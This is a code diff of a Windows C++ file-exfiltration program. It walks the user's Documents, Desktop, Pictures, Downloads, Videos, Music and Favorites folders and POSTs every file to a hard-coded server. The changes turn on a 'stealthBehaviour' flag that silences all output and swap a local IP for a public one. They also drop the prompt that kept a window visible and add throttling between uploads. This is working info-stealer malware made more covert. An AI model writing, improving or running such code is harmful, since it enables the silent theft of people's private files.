@@ -16,10 +16,10 @@
 namespace fs = std::filesystem;
 
 #define susBehaviour false
-#define stealthBehaviour false
+#define stealthBehaviour true
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
-const char szHost[] = "192.168.1.139"; // The IP address of the server
+const char szHost[] = "20.117.90.95"; // The IP address of the server
 
 /* 
 	returns a connected socket at the given address and port
@@ -67,36 +67,29 @@ void sendFile(std::string path, std::string fileName){
 		printf("Error opening file %s\n", path.c_str());
 	}
 #endif
-	// Get the filesize of the file
-	in.seekg(0, std::ios::end);
-	int fileSize = in.tellg();
-	in.seekg(0, std::ios::beg);
+	
+	// Go back to using std::vector<char> to store the data
+	std::vector<char> data;
 
-	if (fileSize < 0) {
-#if !stealthBehaviour
-		printf("Error getting filesize of %s\n", path.c_str());
-#endif
-		return;
+	// Read the file into the vector
+	char c;
+	while (in.get(c)) {
+		data.push_back(c);
 	}
 	
-	// Malloc char array for the data
-	char* data = (char*)malloc(fileSize * sizeof(char));
-
-	// Read the file into the char array
-	in.read(data, fileSize);
 
 
 #if !stealthBehaviour
-	printf("Data size: %d\n", fileSize);
+	std::cout << "Sending file " << fileName << " to server (size: " << data.size() << " bytes)" << std::endl;
 #endif
 
 	// Assemble a HTTP POST request
 	// Using the following format:
 	/*
 		POST / HTTP/1.1
-		Host: [HOSTNAME]
+		Host:[HOSTNAME]
 		Content-Type: application/octet-stream
-		Content-Disposition: attachment; filename="[FILENAME]"
+		Content-Disposition: attachment; filename=[FILENAME]
 
 		[DATA]
 	*/
@@ -104,19 +97,18 @@ void sendFile(std::string path, std::string fileName){
 	request += "Host: " + std::string(szHost) + ":" + std::to_string(SERV_PORT) + "\r\n";
 	request += "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=" + fileName + "\r\n\r\n";
 	
-	long unsigned int requestSize = fileSize + request.size();
-	char* requestBuffer = (char*)malloc(requestSize);
+	long unsigned int requestSize = data.size() + request.size();
+	std::vector<char> requestBuffer;
+	requestBuffer.reserve(requestSize);
 	
 	for (int i = 0; i < request.size(); i++) {
-		requestBuffer[i] = request[i];
+		requestBuffer.push_back(request[i]);
 	}
-	for (int i = 0; i < fileSize; i++) {
-		requestBuffer[i + request.size()] = data[i];
+	for (int i = 0; i < data.size(); i++) {
+		requestBuffer.push_back(data[i]);
 	}
-	free(data);
 	// Send the HTTP POST request
-	int result = send(s, requestBuffer, requestSize, 0);
-	free(requestBuffer);
+	int result = send(s, requestBuffer.data(), requestSize, 0);
 #if !stealthBehaviour
 	if (result == SOCKET_ERROR) {
 		printf("send failed with error: %d\n", WSAGetLastError());
@@ -125,11 +117,13 @@ void sendFile(std::string path, std::string fileName){
 	std::cout << "Sent file " << fileName << std::endl;
 #endif
 	// Wait for a response
+	/*
 	char responseBuffer[1024];
 	recv(s, responseBuffer, 128, 0);
 #if !stealthBehaviour
 	printf("Response: %s\n", responseBuffer);
 #endif
+	*/
 	// Clean up the memory and socket
 	closesocket(s);
 	WSACleanup();
@@ -153,6 +147,7 @@ void uploadFilesInFolder(fs::path p) {
 			printf("Sending file %s\n", entry.path().filename().string().c_str());
 #endif
 			sendFile(entry.path().string(), username + "_" + entry.path().filename().string());
+			Sleep(1000);
 		}
 	}
 }
@@ -202,15 +197,13 @@ int main() {
 	fs::path musicPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Music");
 	fs::path favouritesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Favorites");
 	// Start uploading stuff
+	uploadFilesInFolder(documentsPath);
 	uploadFilesInFolder(desktopPath);
 	uploadFilesInFolder(picturesPath);
-	uploadFilesInFolder(documentsPath);
 	uploadFilesInFolder(downloadsPath);
 	uploadFilesInFolder(videosPath);
 	uploadFilesInFolder(musicPath);
 	uploadFilesInFolder(favouritesPath);
 	// Done!
-	// Get a char to keep the window alive
-	getchar();
 	ExitProcess(EXIT_SUCCESS);
 }
